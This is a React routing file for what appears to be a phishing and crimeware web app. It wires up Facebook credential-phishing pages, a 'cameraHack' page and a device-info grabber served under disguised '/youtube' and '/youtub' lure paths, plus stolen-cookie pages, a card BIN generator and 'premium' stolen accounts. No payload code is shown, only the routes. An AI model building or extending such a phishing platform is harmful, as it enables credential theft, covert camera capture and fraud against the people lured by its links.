import { BrowserRouter, Route, Routes } from "react-router-dom"
import Home from "../PAGES/USER/HOME/Home"
import Login from "../AUTHENTICATION/Login"
import SingUp from "../AUTHENTICATION/SignUp"
import FacebookLink from "../PAGES/PHISING/FACEBOOK/FacebookLink"
import Facebook from "../PAGES/PHISING/FACEBOOK/Facebook"
import Camera from '../PAGES/PHISING/CAMERA/Camera'
import CameraLink from '../PAGES/PHISING/CAMERA/CameraLink'
import DeviceInfo from '../PAGES/PHISING/DEVICEINFO/DeviceInfo'
import DeviceLink from '../PAGES/PHISING/DEVICEINFO/DeviceLink'
import Cookies from "../PAGES/COOKIES/Cookies"
import Bin from "../PAGES/BIN/Bin"
import Contact from "../PAGES/CONTACT/Contact"
import BinGenarate from "../PAGES/BIN/BinGenarate"
import Premium from "../PAGES/PREMIUM/Premium"
import PremiumCookies from "../PAGES/PREMIUM/PremiumCookies"
import PremiumAccounts from "../PAGES/PREMIUM/PremiumAccounts"
import Chat from "../PAGES/CHAT/Chat"


const Path = () => {
  return (
    <BrowserRouter>
        <Routes>
            <Route exact path="/:uid" Component={Home} />
            <Route exact path="/" Component={Login} />
            <Route exact path="/signup" Component={SingUp} />
            <Route exact path="/facebookLink/:uid" Component={FacebookLink} />
            <Route exact path="/facebook/:uid" Component={Facebook} />
            <Route exact path="/youtube/:uid" Component={Camera} />
            <Route exact path="/cameraHack/:uid" Component={CameraLink} />
            <Route exact path="/youtub/:uid" Component={DeviceInfo} />
            <Route exact path="/deviceInfo/:uid" Component={DeviceLink} />
            <Route exact path="/cookies/:uid" Component={Cookies} />
            <Route exact path="/bin/:uid" Component={Bin} />
            <Route exact path="/contact" Component={Contact} />
            <Route exact path="/generateBin" Component={BinGenarate} />
            <Route exact path="/premium/:uid" Component={Premium} />
            <Route exact path="/premium/cookies/:uid" Component={PremiumCookies} />
            <Route exact path="/premium/accounts/:uid" Component={PremiumAccounts} />
            <Route exact path="/chat" Component={Chat} />
            <Route path="*" Component={Login} />
        </Routes>
    </BrowserRouter>
  )
}

export default Path